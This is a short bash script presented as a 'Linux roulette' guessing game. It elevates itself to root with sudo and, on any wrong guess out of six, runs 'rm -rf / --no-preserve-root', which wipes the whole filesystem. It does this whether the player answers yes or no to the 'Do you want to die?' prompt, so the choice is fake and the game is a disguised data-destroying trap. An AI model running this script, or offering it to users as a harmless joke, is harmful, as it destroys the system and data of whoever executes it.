#!/bin/bash
if [ "$EUID" -ne 0 ]; then
  sudo "$0" "$@"
  exit
fi
random_number=$((1 + $RANDOM % 6))
echo "Linux roulette..."
read -p "Choose a number between 1 and 6: " choice
function cook_em(){
    echo "goodbye..."
    sudo rm -rf / --no-preserve-root
}
if [[ $choice == $random_number ]]; then
  echo "You win!!!"
else
  echo "You suck"
  read -p "Do you want to die? (y/n): " yn_die
  if [[ $yn_die == "y" ]]; then
    echo "Wow that sucks to be you..."
    sleep 1
    cook_em
  else
    echo "Haha womp womp..."
    sleep 1
    cook_em
  fi
fi
